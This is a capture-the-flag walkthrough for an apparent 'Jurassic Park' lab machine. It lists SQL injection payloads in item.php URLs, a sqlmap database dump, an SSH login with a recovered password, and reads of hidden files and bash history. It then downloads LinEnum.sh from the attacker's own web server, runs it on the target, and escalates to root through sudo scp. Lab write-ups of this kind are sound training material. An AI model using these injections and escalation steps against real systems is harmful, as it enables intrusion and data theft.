# Jurassic Park

- What is the SQL database called which is serving the shop information?

	- `scilla port -target <TARGET_IP>`
	- Visit `http://<TARGET_IP>`
	- Interesting content here: `http://<TARGET_IP>/item.php?id=5`
	- `scilla dir -target <TARGET_IP>`
	- `/assets` accessible, but nothing interesting.
	- `http://<TARGET_IP>/item.php?id=%27%20OR%201=1%20--%20-`
	- WOOHOO.
	- `sqlmap -u "http://<TARGET_IP>/item.php?id=1" --dump`
	- `****`

- How many columns does the table have?

	- also with: `http://<TARGET_IP>/item.php?id=5%20union%20select%201,2,3,4,5`
	- `5`

- Whats the system version?

	- `ubuntu **.**`

- What is dennis' password?

	- `********`

- Locate and get the first flag contents.

	- `ssh dennis@<TARGET_IP>`, `yes` and enter the password.
	- `cat flag1.txt`
	- `**************************`

- Whats the contents of the second flag?

	- `cat .*`
	- `cat /boot/grub/fonts/flagTwo.txt`
	- `****************************`

- Whats the contents of the third flag?

	- `cat /home/dennis/.bash_history`
	- `****************************`

- There is no fourth flag.

	  no answer needed

- Whats the contents of the fifth flag?

	- `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
	- `sudo python3 -m http.server`
	- `wget http://<YOUR_IP>:8000/LinEnum.sh`
	- `chmod +x LinEnum.sh`
	- `./LinEnum.sh`
	- `sudo -l`
	- scp withou password.
	- https://gtfobins.github.io/gtfobins/scp/#sudo
	- `cat /root/root.txt`
	- `*************************`


